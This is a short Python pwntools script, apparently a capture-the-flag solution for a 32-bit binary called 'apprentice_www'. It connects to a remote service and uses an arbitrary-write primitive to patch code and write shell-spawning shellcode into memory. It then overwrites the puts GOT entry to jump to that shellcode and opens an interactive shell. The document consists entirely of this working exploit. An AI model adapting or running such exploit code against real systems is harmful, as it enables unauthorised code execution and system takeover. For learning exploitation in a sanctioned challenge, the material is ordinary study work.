from pwn import *
#context.log_level = "Debug"
context(os="linux", arch="i386", endian="little")
io = process("./apprentice_www")
e = ELF("./apprentice_www")
io = remote("114.55.66.54", 10001)
#gdb.attach(io, "break main")

shellcode = asm(shellcraft.sh())

def round_construct():
	io.sendline(str(0x80485da))
	io.sendline(str(0b10111100))
	io.sendline(str(0x80485E8))
	io.sendline(str(0b10101110))

def write_code(shellcode):
	for i in range(len(shellcode)):
		io.sendline(str(0x8049000+i))
		io.sendline(str(ord(shellcode[i])))

def hijack_got(addr, got):
	for i in range(len(addr)/2):
		io.sendline(str(got+i))
		print(hex(got+i))
		if i == 0:
			io.sendline(str(int("0x"+addr[-2:],16)))
			print(hex(int("0x"+addr[-2:],16)))
		else:
			io.sendline(str(int("0x"+addr[-(i*2+2):-(i*2)],16)))
			print(hex(int("0x"+addr[-(i*2+2):-(i*2)],16)))

def exec_recover():
	io.sendline(str(0x80485da))
	io.sendline(str(0xe))

print(len(shellcode))
round_construct()
write_code(shellcode)
hijack_got('08049000', e.got['puts'])
exec_recover()
io.interactive()